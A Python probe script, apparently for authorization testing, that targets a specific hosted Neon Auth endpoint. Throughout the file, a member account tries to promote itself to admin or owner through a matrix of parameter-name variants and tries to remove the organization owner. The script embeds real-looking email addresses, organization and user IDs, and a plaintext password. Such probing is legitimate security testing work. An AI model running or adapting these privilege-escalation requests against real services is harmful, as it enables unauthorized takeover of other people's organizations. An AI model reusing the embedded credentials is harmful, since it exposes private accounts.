# -*- coding: utf-8 -*-
"""update-member-role 参数变体矩阵(Neon 网关自定义参数名):
member(secn12) 尝试用 email/userId/memberId 变体自提权 admin/owner"""
import http.client, ssl, json, time

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
ORIGIN = 'http://localhost:3000'
ORG_ID = '5cab4435-9577-44cb-8cf0-50fa9a84ebd7'
N12_UID = 'f0dc6253-0ad2-4471-b5ec-ee09a9ad758a'
N12_EMAIL = 'libobo1229+secn12@gmail.com'
PW = 'SecTest!2026pass2'

def login(email):
    conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
         'Content-Type': 'application/json', 'Origin': ORIGIN}
    conn.request('POST', '/neondb/auth/sign-in/email',
                 json.dumps({'email': email, 'password': PW}).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    st = r.status
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    conn.close()
    ck = ''
    for part in hdrs.get('set-cookie', '').split(','):
        kv = part.strip().split(';')[0]
        if '=' in kv:
            k, v = kv.split('=', 1)
            ck = ck + ('; ' if ck else '') + '%s=%s' % (k.strip(), v.strip())
    return st, ck

def req(cookie, method, path, body=None):
    try:
        conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
             'Content-Type': 'application/json', 'Origin': ORIGIN, 'Cookie': cookie}
        conn.request(method, '/neondb/auth' + path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        conn.close()
        return st, raw.decode('utf-8', 'replace')
    except Exception as e:
        return -1, 'EXC %s' % e

st, ck2 = login('libobo1229+na2@gmail.com')
st, ck12 = login('libobo1229+secn12@gmail.com')
print('owner:', bool(ck2), 'member:', bool(ck12), flush=True)

# 参数变体矩阵(member 视角;owner 同参数做基线)
variants = [
    ('memberIdOrEmail=email', {'memberIdOrEmail': N12_EMAIL, 'role': 'admin', 'organizationId': ORG_ID}),
    ('memberIdOrEmail=email-owner', {'memberIdOrEmail': N12_EMAIL, 'role': 'owner', 'organizationId': ORG_ID}),
    ('memberIdOrEmail=uid', {'memberIdOrEmail': N12_UID, 'role': 'admin', 'organizationId': ORG_ID}),
    ('userId=uid', {'userId': N12_UID, 'role': 'admin', 'organizationId': ORG_ID}),
    ('memberId=uid', {'memberId': N12_UID, 'role': 'admin', 'organizationId': ORG_ID}),
    ('memberId=email', {'memberId': N12_EMAIL, 'role': 'admin', 'organizationId': ORG_ID}),
    ('email=email', {'email': N12_EMAIL, 'role': 'admin', 'organizationId': ORG_ID}),
    ('remove-variant', None),  # remove-member 变体单独处理
]
print('\n=== update-member-role 变体(member 自提权) ===', flush=True)
for name, b in variants:
    if b is None:
        continue
    st_a, raw_a = req(ck12, 'POST', '/organization/update-member-role', b)
    st_b, raw_b = req(ck2, 'POST', '/organization/update-member-role', b)
    flag = ''
    if st_a == 200:
        flag = ' <<<<<< MEMBER 200!'
    print('[%s] member->%d %s | owner->%d %s%s' % (
        name, st_a, raw_a[:120].replace('\n', ' '), st_b, raw_b[:120].replace('\n', ' '), flag), flush=True)
    time.sleep(0.25)

print('\n=== remove-member 变体(member 移除 owner) ===', flush=True)
for b in [
    {'memberIdOrEmail': 'libobo1229+na2@gmail.com', 'organizationId': ORG_ID},
    {'memberIdOrEmail': '8e3f631f-3ec6-4d71-b580-195b52a30ab3', 'organizationId': ORG_ID},
]:
    st_a, raw_a = req(ck12, 'POST', '/organization/remove-member', b)
    st_b, raw_b = req(ck2, 'POST', '/organization/remove-member', b)
    flag = ' <<<<<< MEMBER 200!' if st_a == 200 else ''
    print('[member->%s] member->%d %s | owner->%d %s%s' % (
        str(b)[:60], st_a, raw_a[:120].replace('\n', ' '), st_b, raw_b[:120].replace('\n', ' '), flag), flush=True)
    time.sleep(0.25)

print('\n=== 终态:org list(角色未被意外改动) ===', flush=True)
st, raw = req(ck2, 'GET', '/organization/list')
print('owner orgs:', st, raw[:300].replace('\n', ' '), flush=True)
